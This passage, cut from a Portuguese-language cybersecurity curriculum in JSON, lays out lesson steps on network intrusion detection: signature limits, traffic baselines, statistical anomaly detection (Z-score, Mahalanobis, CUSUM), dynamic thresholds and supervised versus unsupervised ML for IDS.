                                  "verification": "Produza um relatório de 1 página resumindo análise; apresente oralmente.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Template de matriz SWOT",
                                    "Casos de estudo de breaches (ex: Equifax report)"
                                  ],
                                  "tips": "Priorize limitações críticas para priorização em defesas.",
                                  "learningObjective": "Aplicar conhecimento para decisões de segurança.",
                                  "commonMistakes": [
                                    "Falta de equilíbrio entre prós e contras; generalizações excessivas"
                                  ]
                                }
                              ],
                              "practicalExample": "Configure o Snort em um lab virtual (usando VirtualBox). Injete tráfego com exploit conhecido (ex: EternalBlue SMB) - detecta perfeitamente. Em seguida, teste um payload ofuscado ou zero-day simulado (ex: script custom) - falha na detecção, demonstrando prós e contras.",
                              "finalVerifications": [
                                "Pode listar pelo menos 3 vantagens com exemplos?",
                                "Explica 3 limitações e como mitigar?",
                                "Diferencia detecção por assinaturas de zero-day?",
                                "Cria diagrama de fluxo de evasão por ofuscação?",
                                "Avalia adequação para rede corporativa?",
                                "Compara com detecção comportamental?"
                              ],
                              "assessmentCriteria": [
                                "Precisão e completude na lista de vantagens (mín. 3 com justificativa)",
                                "Profundidade na análise de limitações, incluindo exemplos reais (mín. 3)",
                                "Capacidade de síntese em cenários práticos",
                                "Uso correto de terminologia técnica",
                                "Equilíbrio entre prós e contras sem viés"
                              ],
                              "crossCurricularConnections": [
                                "Matemática: Teoria de strings e algoritmos de matching (ex: Boyer-Moore)",
                                "Programação: Desenvolvimento de regras em linguagens como YAML para Suricata",
                                "Ética e Direito: Implicações de privacidade em monitoramento de tráfego",
                                "Análise de Dados: Processamento de logs para atualização de assinaturas"
                              ],
                              "realWorldApplication": "Em empresas como bancos ou governos, ferramentas como Snort ou Cisco Snort protegem perímetros de rede detectando malware conhecido com alta precisão, mas são complementadas por sandboxing para zero-days, evitando breaches como o WannaCry que explorou assinaturas ausentes."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.3.3.2",
                        "name": "Detecção de Anomalias",
                        "description": "Princípios de identificação de ataques por meio de desvios estatísticos ou comportamentais do tráfego normal de rede, utilizando baselines de normalidade.",
                        "specificSkills": [
                          {
                            "id": "10.1.3.3.2.1",
                            "name": "Estabelecer baselines de tráfego normal",
                            "description": "Explicar métodos para coletar e modelar dados de tráfego benigno, como médias, desvios padrão e perfis temporais de uso de rede.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Selecionar e Configurar Ferramentas de Captura de Tráfego",
                                  "subSteps": [
                                    "Identifique ferramentas adequadas como Wireshark, tcpdump ou Tshark para captura de pacotes em uma rede controlada.",
                                    "Instale e configure a ferramenta em um ambiente de teste isolado para evitar interferência em redes de produção.",
                                    "Defina filtros de captura para focar em tráfego benigno (ex: HTTP, HTTPS, DNS de fontes conhecidas).",
                                    "Inicie a captura em horários variados para representar uso normal (pico e fora de pico).",
                                    "Garanta que a captura cubra pelo menos 24-48 horas contínuas para dados representativos."
                                  ],
                                  "verification": "Verifique logs de captura mostrando volume de dados coletados (ex: >1GB) sem erros de permissão ou perda de pacotes.",
                                  "estimatedTime": "1-2 horas",
                                  "materials": [
                                    "Wireshark ou tcpdump instalado",
                                    "Máquina virtual com rede isolada",
                                    "Documentação de filtros PCAP"
                                  ],
                                  "tips": "Use modo promiscuous apenas se necessário; priorize capturas em spans múltiplos para robustez.",
                                  "learningObjective": "Configurar ferramentas de monitoramento de rede para coleta precisa de tráfego benigno.",
                                  "commonMistakes": [
                                    "Capturar em rede de produção sem aprovação",
                                    "Ignorar filtros levando a dados irrelevantes",
                                    "Parar captura prematuramente"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Processar e Limpar Dados Coletados",
                                  "subSteps": [
                                    "Exporte dados PCAP para formato analisável (CSV ou JSON) usando tshark ou scripts Python com Scapy.",
                                    "Remova pacotes anômalos iniciais (ex: scans de portas ou tráfego externo inesperado) via inspeção manual/visual.",
                                    "Normalize campos chave: volume de bytes/pacotes por IP, porta e protocolo.",
                                    "Segmente dados por intervalos temporais (ex: por hora ou dia) para análise temporal.",
                                    "Valide integridade: cheque por gaps em timestamps ou perdas de pacotes."
                                  ],
                                  "verification": "Dataset limpo com pelo menos 90% de dados benignos confirmados por amostragem visual em Wireshark.",
                                  "estimatedTime": "2-3 horas",
                                  "materials": [
                                    "Python com bibliotecas pandas, scapy",
                                    "Editor de PCAP como Wireshark",
                                    "Planilha ou Jupyter Notebook"
                                  ],
                                  "tips": "Automatize limpeza com scripts regex para eficiência; backup dados originais antes de editar.",
                                  "learningObjective": "Limpar e preparar datasets de tráfego para modelagem estatística confiável.",
                                  "commonMistakes": [
                                    "Não segmentar temporalmente",
                                    "Incluir tráfego malicioso como baseline",
                                    "Perder metadados durante exportação"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Calcular Estatísticas Descritivas e Modelar Baseline",
                                  "subSteps": [
                                    "Calcule médias móveis e desvios padrão para métricas como pacotes/segundo, bytes/segundo por fluxo.",
                                    "Gere histogramas e boxplots para distribuição de tráfego por protocolo e hora do dia.",
                                    "Crie perfis temporais: médias por hora/dia/semana usando pandas groupby.",
                                    "Defina thresholds iniciais: média + 2*desvio padrão para alertas preliminares.",
                                    "Visualize baselines com gráficos (ex: matplotlib para séries temporais)."
                                  ],
                                  "verification": "Relatório com tabelas de médias/desvios e gráficos mostrando padrões claros de tráfego normal.",
                                  "estimatedTime": "2-4 horas",
                                  "materials": [
                                    "Python/pandas/matplotlib/seaborn",
                                    "Jupyter Notebook",
                                    "Exemplos de datasets públicos como CIC-IDS"
                                  ],
                                  "tips": "Use janelas deslizantes para médias; teste com dados sintéticos para validação.",
                                  "learningObjective": "Aplicar estatística descritiva para quantificar e visualizar baselines de tráfego.",
                                  "commonMistakes": [
                                    "Usar toda a amostra sem normalização sazonal",
                                    "Ignorar outliers benignos como picos de backup",
                                    "Escolher thresholds arbitrários"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Validar e Documentar a Baseline",
                                  "subSteps": [
                                    "Simule tráfego normal adicional e verifique se cai dentro da baseline (taxa de falsos positivos <5%).",
                                    "Compare com baselines de referência (ex: datasets públicos como MAWI ou UNSW-NB15 benigno).",
                                    "Documente metodologia, suposições e limitações em um relatório estruturado.",
                                    "Armazene baseline em formato reutilizável (JSON/CSV com metadados).",
                                    "Planeje atualizações periódicas (ex: recaptura mensal)."
                                  ],
                                  "verification": "Testes de simulação mostram >95% de tráfego normal classificado corretamente; relatório completo gerado.",
                                  "estimatedTime": "1-2 horas",
                                  "materials": [
                                    "Datasets de teste benignos",
                                    "Ferramentas de simulação como tcpreplay",
                                    "Template de relatório Markdown"
                                  ],
                                  "tips": "Automatize validação com scripts; inclua sensibilidade a mudanças sazonais.",
                                  "learningObjective": "Validar robustez da baseline e documentar para uso em sistemas de detecção.",
                                  "commonMistakes": [
                                    "Não testar com variações reais",
                                    "Documentação incompleta sem thresholds",
                                    "Baseline estática sem plano de update"
                                  ]
                                }
                              ],
                              "practicalExample": "Em uma rede de escritório com 50 usuários, capture tráfego por 7 dias usando tcpdump. Calcule média de 500 pacotes/segundo durante horário comercial (9h-18h) com desvio de 150, e perfil temporal mostrando pico às 14h. Use isso para detectar inchaço de tráfego >800 pacotes/seg como anomalia.",
                              "finalVerifications": [
                                "Baseline captura variações diárias/semanais com <5% de falsos positivos em testes.",
                                "Estatísticas incluem médias, desvios e perfis temporais documentados.",
                                "Visualizações mostram padrões claros de tráfego benigno.",
                                "Thresholds definidos baseados em 2-3 desvios padrão.",
                                "Documentação inclui metodologia e plano de manutenção.",
                                "Baseline validada contra datasets de referência."
                              ],
                              "assessmentCriteria": [
                                "Precisão na coleta: dados representativos e limpos (90%+ cobertura).",
                                "Qualidade estatística: cálculos corretos de médias/desvios com visualizações.",
                                "Robustez temporal: perfis por hora/dia integrados.",
                                "Validação eficaz: testes simulados com métricas de performance.",
                                "Documentação completa: clara, reproduzível e profissional.",
                                "Eficiência: tempos dentro do estimado com automação onde possível."
                              ],
                              "crossCurricularConnections": [
                                "Estatística: Cálculo de médias, desvios e distribuições.",
                                "Programação: Scripts Python para processamento de dados.",
                                "Análise de Dados: Limpeza, visualização e modelagem.",
                                "Redes de Computadores: Entendimento de protocolos e métricas de tráfego.",
                                "Machine Learning: Preparação para modelos de detecção de anomalias."
                              ],
                              "realWorldApplication": "Em um Security Operations Center (SOC), baselines de tráfego normal são usadas em ferramentas como Zeek ou Suricata para detectar intrusões via desvios, prevenindo ataques DDoS ou exfiltração de dados em empresas como bancos ou provedores de cloud."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.3.3.2.2",
                            "name": "Aplicar técnicas estatísticas para detecção de anomalias",
                            "description": "Descrever abordagens como testes de outlier (Z-score, Mahalanobis distance) e detecção de mudanças abruptas em séries temporais de tráfego.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Preparar dados e entender distribuições estatísticas",
                                  "subSteps": [
                                    "Colete um dataset de tráfego de rede (ex: bytes por segundo, pacotes por minuto).",
                                    "Calcule estatísticas descritivas: média, mediana, desvio padrão e skewness.",
                                    "Visualize distribuições com histogramas e boxplots para identificar potenciais anomalias.",
                                    "Normalize ou padronize os dados se necessário.",
                                    "Defina threshold para anomalias baseado em conhecimento de domínio (ex: 3 desvios padrão)."
                                  ],
                                  "verification": "Dataset preparado com estatísticas calculadas e visualizações geradas sem erros.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": "Python, bibliotecas pandas, numpy, matplotlib/seaborn; dataset de tráfego de rede (ex: KDD Cup 1999 ou simulado).",
                                  "tips": "Use funções prontas como df.describe() para estatísticas rápidas.",
                                  "learningObjective": "Compreender a importância da preparação de dados para detecção estatística de anomalias.",
                                  "commonMistakes": "Ignorar valores ausentes ou não tratar outliers óbvios antes da análise."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Implementar detecção de outliers com Z-score",
                                  "subSteps": [
                                    "Calcule Z-score para cada ponto de dados: (x - μ) / σ.",
                                    "Identifique outliers onde |Z-score| > threshold (tipicamente 3).",
                                    "Aplique em dados univariados de tráfego (ex: taxa de bytes).",
                                    "Visualize Z-scores e marque outliers.",
                                    "Teste sensibilidade variando o threshold."
                                  ],
                                  "verification": "Lista de outliers detectados com Z-scores calculados corretamente.",
                                  "estimatedTime": "1 hora",
                                  "materials": "Python com scipy.stats.zscore; Jupyter Notebook.",
                                  "tips": "Combine com rolling windows para dados de séries temporais.",
                                  "learningObjective": "Aplicar Z-score para detecção univariada de anomalias em tráfego de rede.",
                                  "commonMistakes": "Aplicar Z-score em dados não normais sem transformação (ex: log)."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Aplicar distância de Mahalanobis para detecção multivariada",
                                  "subSteps": [
                                    "Construa matriz de covariância para múltiplas features (ex: bytes, pacotes, duração).",
                                    "Calcule distância de Mahalanobis: sqrt((x - μ)^T * Σ^-1 * (x - μ)).",
                                    "Defina threshold via qui-quadrado (χ² com graus de liberdade = número de features).",
                                    "Identifique e visualize anomalias multivariadas.",
                                    "Compare resultados com Z-score univariado."
                                  ],
                                  "verification": "Anomalias multivariadas detectadas com distâncias calculadas e threshold aplicado.",
                                  "estimatedTime": "2 horas",
                                  "materials": "Python com numpy e scipy.spatial.distance.mahalanobis.",
                                  "tips": "Verifique se matriz de covariância é invertível (evite multicolinearidade).",
                                  "learningObjective": "Usar Mahalanobis para capturar correlações entre features em detecção de anomalias.",
                                  "commonMistakes": "Não verificar singularidade da matriz de covariância."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Detectar mudanças abruptas em séries temporais de tráfego",
                                  "subSteps": [
                                    "Escolha método como CUSUM: S_t = max(0, S_{t-1} + (x_t - μ) - k).",
                                    "Implemente CUSUM para detectar desvios cumulativos em séries de tráfego.",
                                    "Defina parâmetros k (allowance) e h (threshold) via simulações.",
                                    "Aplique em dados temporais e sinalize mudanças abruptas.",
                                    "Valide com visualizações de séries e alarmes."
                                  ],
                                  "verification": "Mudanças abruptas detectadas com estatísticas CUSUM acima do threshold.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": "Python com pandas para séries temporais; implementações custom de CUSUM.",
                                  "tips": "Use dados com timestamp para resampling horário/diário.",
                                  "learningObjective": "Detectar mudanças de regime em séries temporais de rede usando técnicas estatísticas.",
                                  "commonMistakes": "Escolha inadequada de k/h levando a falsos positivos/negativos."
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Integrar técnicas e validar detecções em cenário de rede",
                                  "subSteps": [
                                    "Combine Z-score, Mahalanobis e CUSUM em pipeline único.",
                                    "Aplique em dataset completo de tráfego de rede com labels conhecidos.",
                                    "Calcule métricas: precisão, recall, F1-score para anomalias.",
                                    "Ajuste thresholds para otimizar performance.",
                                    "Gere relatório com exemplos de detecções."
                                  ],
                                  "verification": "Pipeline integrado funcionando com métricas de avaliação acima de 80%.",
                                  "estimatedTime": "2 horas",
                                  "materials": "Scikit-learn para métricas; dataset rotulado (ex: NSL-KDD).",
                                  "tips": "Use cross-validation para robustez.",
                                  "learningObjective": "Integrar múltiplas técnicas estatísticas para detecção robusta de anomalias em cibersegurança.",
                                  "commonMistakes": "Sobreajuste de thresholds sem validação em dados de teste."
                                }
                              ],
                              "practicalExample": "Em um dataset de tráfego de rede com 10.000 pacotes, use Z-score para detectar picos de bytes (ex: DDoS simulando 500% acima da média), Mahalanobis para tráfego malicioso com padrões correlacionados (ex: scan de portas), e CUSUM para mudança abrupta de 20% na taxa de pacotes indicando botnet.",
                              "finalVerifications": [
                                "Z-scores e Mahalanobis calculados corretamente para pelo menos 90% dos dados.",
                                "CUSUM detecta mudanças simuladas com delay < 5 pontos.",
                                "Pipeline identifica 85% das anomalias injetadas sem >15% falsos positivos.",
                                "Visualizações mostram anomalias claramente marcadas.",
                                "Relatório gerado com métricas e exemplos.",
                                "Código roda sem erros em dataset de teste independente."
                              ],
                              "assessmentCriteria": [
                                "Precisão na implementação das fórmulas estatísticas (100% correto).",
                                "Adequação de thresholds e parâmetros (otimização via métricas).",
                                "Capacidade de lidar com dados multivariados e temporais.",
                                "Qualidade das visualizações e relatórios.",
                                "Robustez do pipeline em dados reais/ruído.",
                                "Explicação clara de resultados e limitações."
                              ],
                              "crossCurricularConnections": [
                                "Estatística: Distribuições, testes de hipótese.",
                                "Programação: Manipulação de dados com Python/pandas.",
                                "Machine Learning: Preparação para modelos não-supervisionados.",
                                "Matemática: Álgebra linear para Mahalanobis.",
                                "Análise de Dados: Visualização e séries temporais."
                              ],
                              "realWorldApplication": "Em sistemas de detecção de intrusão (IDS) como Suricata ou Zeek, essas técnicas monitoram tráfego em tempo real para alertar sobre DDoS, scans ou exfiltração de dados em redes corporativas ou provedores de internet."
                            },
                            "estimatedTime": "3 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.3.3.2.3",
                            "name": "Avaliar desafios na detecção de anomalias",
                            "description": "Analisar problemas como adaptação a mudanças no tráfego normal, alto índice de falsos positivos e necessidade de thresholds dinâmicos.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Identificar e Compreender Mudanças no Tráfego Normal",
                                  "subSteps": [
                                    "Estude padrões de tráfego normal em redes (ex: horários de pico, atualizações de software).",
                                    "Colete dados históricos de tráfego de rede usando ferramentas como Wireshark.",
                                    "Analise como eventos sazonais (feriados, backups) alteram baselines normais.",
                                    "Modele mudanças usando gráficos de distribuição temporal.",
                                    "Compare tráfego normal vs. drift gradual para diferenciar de anomalias."
                                  ],
                                  "verification": "Crie um relatório resumindo 3 exemplos de mudanças no tráfego normal e seu impacto em detectores estáticos.",
                                  "estimatedTime": "2 horas",
                                  "materials": "Wireshark, datasets de tráfego KDD Cup 1999, planilha Excel ou Python com Pandas.",
                                  "tips": "Sempre normalize dados por volume para isolar padrões temporais.",
                                  "learningObjective": "Reconhecer como drifts no tráfego normal degradam a precisão de modelos de detecção.",
                                  "commonMistakes": "Confundir variações sazonais com ataques iniciais; ignorar normalização de dados."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Analisar Causas e Impactos de Falsos Positivos Elevados",
                                  "subSteps": [
                                    "Defina falsos positivos (FP) como alertas em tráfego benigno e calcule taxa FP = FP / (FP + TN).",
                                    "Identifique causas: ruído em dados, overfitting de modelos, thresholds fixos inadequados.",
                                    "Simule FP em um dataset com injeção de ruído gaussiano.",
                                    "Meça impacto: fadiga de analistas, perda de confiança no sistema.",
                                    "Compare FP em detectores rule-based vs. ML-based."
                                  ],
                                  "verification": "Gere um gráfico ROC mostrando trade-off FP/TP para um modelo simulado.",
                                  "estimatedTime": "2.5 horas",
                                  "materials": "Python (Scikit-learn para métricas), Jupyter Notebook, dataset CIC-IDS2017.",
                                  "tips": "Use validação cruzada para estimar FP em cenários reais variados.",
                                  "learningObjective": "Quantificar e diagnosticar falsos positivos como bottleneck principal em detecção de anomalias.",
                                  "commonMistakes": "Focar apenas em FP sem considerar falsos negativos (FN); usar métricas inadequadas como accuracy."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Explorar Necessidade e Implementação de Thresholds Dinâmicos",
                                  "subSteps": [
                                    "Explique thresholds dinâmicos: adaptam-se via estatísticas móveis (ex: Z-score com janela deslizante).",
                                    "Implemente um threshold adaptativo em código: média + 3*desvio padrão recente.",
                                    "Teste em dados com drift: compare performance antes/depois da adaptação.",
                                    "Discuta algoritmos avançados como EWMA (Exponentially Weighted Moving Average).",
                                    "Avalie custo computacional vs. ganho em precisão."
                                  ],
                                  "verification": "Desenvolva e execute um script Python mostrando redução de FP com threshold dinâmico em um dataset.",
                                  "estimatedTime": "3 horas",
                                  "materials": "Python (NumPy, SciPy), código-fonte de detectores como Isolation Forest.",
                                  "tips": "Ajuste tamanho da janela baseado na volatilidade do tráfego (menor para redes voláteis).",
                                  "learningObjective": "Dominar thresholds dinâmicos como solução para adaptação em ambientes de rede evolutivos.",
                                  "commonMistakes": "Definir janelas fixas muito grandes/pequenas; negligenciar latência em produção."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Avaliar Desafios Holísticos e Estratégias de Mitigação",
                                  "subSteps": [
                                    "Integre desafios: crie matriz de trade-offs (adaptação vs. FP vs. latência).",
                                    "Proponha ensemble methods: combine múltiplos detectores com pesos dinâmicos.",
                                    "Simule cenários compostos (drift + FP alto) e avalie métricas F1-score.",
                                    "Discuta monitoramento contínuo e retraining de modelos.",
                                    "Elabore plano de resposta para alertas persistentes."
                                  ],
                                  "verification": "Produza um framework de avaliação com tabela de métricas pré/pós-mitigação.",
                                  "estimatedTime": "2 horas",
                                  "materials": "Ferramentas de visualização (Matplotlib, Tableau), relatórios de incidentes reais (ex: MITRE ATT&CK).",
                                  "tips": "Priorize métricas business-aligned como tempo médio para triagem de alertas.",
                                  "learningObjective": "Sintetizar desafios em uma visão holística com estratégias acionáveis para produção.",
                                  "commonMistakes": "Isolar desafios sem considerar interdependências; superestimar soluções sem testes empíricos."
                                }
                              ],
                              "practicalExample": "Em uma rede corporativa durante o Black Friday, o tráfego de e-commerce aumenta 300%, causando falsos positivos em um detector de anomalias com threshold fixo. Implemente um threshold dinâmico baseado em EWMA para adaptar, reduzindo FP de 25% para 8%, permitindo foco em um DDoS real simultâneo.",
                              "finalVerifications": [
                                "Explicar verbalmente como drifts no tráfego afetam baselines e soluções adaptativas.",
                                "Calcular manualmente taxa de FP em um dataset pequeno fornecido.",
                                "Implementar e demonstrar um threshold dinâmico em código ao vivo.",
                                "Criar matriz de trade-offs para 3 cenários de rede reais.",
                                "Propor mitigações personalizadas para um caso hipotético de alto FP.",
                                "Interpretar curvas ROC/PR para um modelo de detecção."
                              ],
                              "assessmentCriteria": [
                                "Profundidade na análise de causas raiz (80% cobertura dos desafios listados).",
                                "Precisão quantitativa em métricas (FP, F1-score com erro <5%).",
                                "Criatividade e viabilidade em soluções dinâmicas (thresholds, ensembles).",
                                "Clareza na comunicação via relatórios/gráficos (rubrica visual 4/5).",
                                "Integração holística de desafios (matriz completa de interdependências).",
                                "Evidência de testes práticos (código executável com resultados)."
                              ],
                              "crossCurricularConnections": [
                                "Estatística: Distribuições probabilísticas e testes de hipótese para baselines.",
                                "Machine Learning: Modelos não-supervisionados e detecção de outliers.",
                                "Gestão de Dados: Limpeza e feature engineering para tráfego de rede.",
                                "Análise de Sistemas: Trade-offs de performance em tempo real.",
                                "Ética em TI: Balanceamento de falsos positivos vs. riscos de segurança."
                              ],
                              "realWorldApplication": "Em centros de operações de segurança (SOCs) de empresas como bancos ou e-commerces, onde detectores de anomalias monitoram 24/7; thresholds dinâmicos evitam sobrecarga de analistas durante picos, como em ataques à Netflix ou AWS, melhorando resposta a ameaças reais como zero-days."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.3.3.3",
                        "name": "Detecção Baseada em Aprendizado de Máquina",
                        "description": "Uso de algoritmos de machine learning para classificar tráfego de rede como malicioso ou benigno, treinando modelos com dados rotulados ou não rotulados.",
                        "specificSkills": [
                          {
                            "id": "10.1.3.3.3.1",
                            "name": "Diferenciar abordagens supervisionadas e não supervisionadas",
                            "description": "Comparar aprendizado supervisionado (ex: SVM, árvores de decisão) com não supervisionado (ex: clustering K-means) para detecção de ataques.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Entender os Fundamentos do Aprendizado Supervisionado",
                                  "subSteps": [
                                    "Defina aprendizado supervisionado como um método onde o modelo é treinado com dados rotulados (entradas e saídas conhecidas).",
                                    "Estude exemplos chave: SVM (Support Vector Machines) para classificação binária/multiclasse e árvores de decisão para classificação/regressão hierárquica.",
                                    "Analise o processo: divisão de dados em treino/teste, treinamento do modelo e avaliação com métricas como acurácia e precisão.",
                                    "Identifique requisitos: necessidade de dataset rotulado de alta qualidade.",
                                    "Explore vantagens (alta precisão com labels) e desvantagens (custo de rotulagem)."
                                  ],
                                  "verification": "Crie um fluxograma resumindo o pipeline de treinamento supervisionado e liste 2 exemplos de algoritmos.",
                                  "estimatedTime": "45 minutos",
                                  "materials": "Documentação scikit-learn (SVM e DecisionTreeClassifier), vídeo introdutório sobre ML supervisionado no YouTube ou Coursera.",
                                  "tips": "Use diagramas visuais para mapear o fluxo de dados rotulados para predições.",
                                  "learningObjective": "Compreender os princípios e exemplos de aprendizado supervisionado.",
                                  "commonMistakes": "Confundir com não supervisionado por falta de ênfase em labels; ignorar custo de rotulagem de dados."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Entender os Fundamentos do Aprendizado Não Supervisionado",
                                  "subSteps": [
                                    "Defina aprendizado não supervisionado como método que trabalha com dados não rotulados, descobrindo padrões intrínsecos.",
                                    "Estude exemplo chave: K-means clustering para agrupar dados semelhantes sem labels prévios.",
                                    "Analise o processo: inicialização de centróides, atribuição de clusters e iteração até convergência.",
                                    "Identifique requisitos: dados não rotulados em grande volume.",
                                    "Explore vantagens (descoberta de anomalias desconhecidas) e desvantagens (interpretação subjetiva dos clusters)."
                                  ],
                                  "verification": "Implemente um K-means simples em um dataset de tráfego de rede (ex: KDD Cup) e visualize os clusters.",
                                  "estimatedTime": "60 minutos",
                                  "materials": "Biblioteca scikit-learn (KMeans), dataset KDD Cup 99 ou NSL-KDD, Jupyter Notebook.",
                                  "tips": "Visualize clusters com scatter plots para entender separação intuitiva.",
                                  "learningObjective": "Dominar conceitos e exemplos de aprendizado não supervisionado.",
                                  "commonMistakes": "Assumir que clusters representam classes sem validação; escolher K errado sem elbow method."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Comparar Abordagens Supervisionadas e Não Supervisionadas",
                                  "subSteps": [
                                    "Crie uma tabela comparativa: dados necessários (rotulados vs não), objetivos (classificação vs clustering), métricas (acurácia vs silhouette score).",
                                    "Discuta cenários: supervisionado para ataques conhecidos; não supervisionado para zero-day.",
                                    "Analise trade-offs: supervisionado é mais preciso mas menos flexível; não supervisionado detecta novel threats mas gera falsos positivos.",
                                    "Estude híbridos: uso combinado em detecção de intrusões.",
                                    "Resuma diferenças chave em um mindmap."
                                  ],
                                  "verification": "Preencha uma tabela de comparação com pelo menos 5 diferenças e 2 vantagens/desvantagens cada.",
                                  "estimatedTime": "50 minutos",
                                  "materials": "Planilha Google Sheets ou papel para tabela, artigos sobre ML em IDS (ex: IEEE papers).",
                                  "tips": "Use exemplos concretos de detecção de ataques para cada coluna da tabela.",
                                  "learningObjective": "Capacitar comparação precisa entre as duas abordagens.",
                                  "commonMistakes": "Ignorar contexto de cibersegurança; superestimar precisão do não supervisionado."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Aplicar à Detecção de Ataques de Rede",
                                  "subSteps": [
                                    "Simule detecção supervisionada: treine SVM em dataset rotulado para DDoS vs normal.",
                                    "Simule não supervisionada: aplique K-means para identificar clusters anômalos em tráfego.",
                                    "Compare resultados: precisão em known attacks vs detecção de unknowns.",
                                    "Avalie em cenários reais: supervisão para signatures-based, não supervisão para anomaly-based IDS.",
                                    "Documente quando escolher cada abordagem."
                                  ],
                                  "verification": "Execute notebooks paralelos com SVM e K-means no mesmo dataset e compare métricas.",
                                  "estimatedTime": "90 minutos",
                                  "materials": "Jupyter Notebook, scikit-learn, dataset CIC-IDS2017 ou similar.",
                                  "tips": "Normalize dados antes de clustering para evitar bias por escala.",
                                  "learningObjective": "Aplicar diferenças no contexto de cibersegurança.",
                                  "commonMistakes": "Usar dataset desbalanceado sem oversampling; ignorar feature engineering."
                                }
                              ],
                              "practicalExample": "Em um sistema de IDS, use SVM supervisionado para classificar pacotes de rede rotulados como 'DDoS' ou 'normal' com 95% acurácia em ataques conhecidos. Para um ataque zero-day como um novo ransomware, aplique K-means não supervisionado para clusterizar tráfego anômalo (silhouette score >0.6), detectando outliers sem labels prévios.",
                              "finalVerifications": [
                                "Explique verbalmente 5 diferenças principais entre supervisionado e não supervisionado.",
                                "Crie uma tabela comparativa precisa com exemplos de algoritmos.",
                                "Implemente e compare SVM vs K-means em um dataset de rede real.",
                                "Identifique cenários ideais para cada abordagem em cibersegurança.",
                                "Liste vantagens/desvantagens com exemplos de detecção de ataques.",
                                "Avalie um modelo híbrido conceitualmente."
                              ],
                              "assessmentCriteria": [
                                "Precisão na definição e exemplos de cada abordagem (90%+ corretude).",
                                "Profundidade da comparação (cobertura de dados, processo, métricas e trade-offs).",
                                "Aplicação correta ao contexto de detecção de intrusões.",
                                "Implementação prática sem erros de código (execução bem-sucedida).",
                                "Análise de resultados com métricas quantitativas.",
                                "Criatividade em cenários híbridos."
                              ],
                              "crossCurricularConnections": [
                                "Estatística: compreensão de distribuições e testes de hipóteses para validação de clusters.",
                                "Programação: implementação em Python com scikit-learn e visualização em Matplotlib.",
                                "Redes de Computadores: conhecimento de protocolos e tráfego para feature selection.",
                                "Ética em IA: discussão de bias em datasets rotulados de cibersegurança."
                              ],
                              "realWorldApplication": "Em ferramentas como Snort com ML plugins ou ELK Stack com anomaly detection, supervisionado identifica ataques conhecidos como SQL injection, enquanto não supervisionado flagra comportamentos anômalos em SIEM systems de empresas como Splunk, reduzindo tempo de resposta a threats zero-day em redes corporativas."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.3.3.3.2",
                            "name": "Implementar pipeline de ML para detecção de rede",
                            "description": "Descrever etapas de extração de features (ex: entropia de cabeçalhos, duração de fluxos), treinamento, validação e inferência em tempo real.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Coleta e Preparação de Dados de Tráfego de Rede",
                                  "subSteps": [
                                    "Selecionar dataset público como CIC-IDS2017 ou NSL-KDD contendo tráfego normal e ataques.",
                                    "Carregar dados usando pandas em Python e explorar estrutura (colunas como src_ip, dst_ip, duração, bytes).",
                                    "Limpar dados: remover duplicatas, tratar valores ausentes e normalizar formatos de timestamp.",
                                    "Dividir dataset em treino (70%), validação (15%) e teste (15%).",
                                    "Rotular dados como 'normal' ou 'ataque' baseado em ground truth."
                                  ],
                                  "verification": "Dataset carregado e dividido corretamente, sem erros de shape mismatch (verificar com df.shape e df.info()).",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Python 3.8+, bibliotecas: pandas, numpy, scikit-learn",
                                    "Dataset CIC-IDS2017 baixado",
                                    "Jupyter Notebook"
                                  ],
                                  "tips": "Use seed fixa (random_state=42) para reprodutibilidade.",
                                  "learningObjective": "Compreender e preparar dados de rede para modelagem ML.",
                                  "commonMistakes": [
                                    "Ignorar desbalanceamento de classes (mais normais que ataques)",
                                    "Não tratar outliers em features numéricas",
                                    "Confundir src/dst ports"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Extração de Features Específicas",
                                  "subSteps": [
                                    "Calcular entropia de cabeçalhos: usar Shannon entropy em distribuições de IP src/dst e ports.",
                                    "Extrair duração de fluxos: delta entre first_seen e last_seen packets.",
                                    "Criar features agregadas: total bytes/packets, avg packet size, inter-arrival time.",
                                    "Aplicar transformações: log em features skewed, one-hot em categóricas como protocol.",
                                    "Salvar features em novo DataFrame e vetorizar com sklearn ColumnTransformer."
                                  ],
                                  "verification": "Features extraídas geram array numérico sem NaNs (assert np.isfinite(X).all()).",
                                  "estimatedTime": "3 horas",
                                  "materials": [
                                    "Bibliotecas: scipy.stats para entropy, feature-engine",
